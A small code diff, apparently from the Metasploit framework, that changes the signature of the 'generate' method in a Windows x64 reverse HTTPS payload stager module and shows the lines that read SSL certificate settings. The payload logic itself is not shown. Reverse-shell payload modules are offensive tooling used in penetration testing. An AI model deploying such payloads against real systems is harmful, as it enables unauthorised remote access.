@@ -28,7 +28,7 @@ module Payload::Windows::ReverseWinHttps_x64
   #
   # Generate the first stage
   #
-  def generate
+  def generate(_opts = {})
 
     verify_cert_hash = get_ssl_cert_hash(datastore['StagerVerifySSLCert'],
                                          datastore['HandlerSSLCert'])
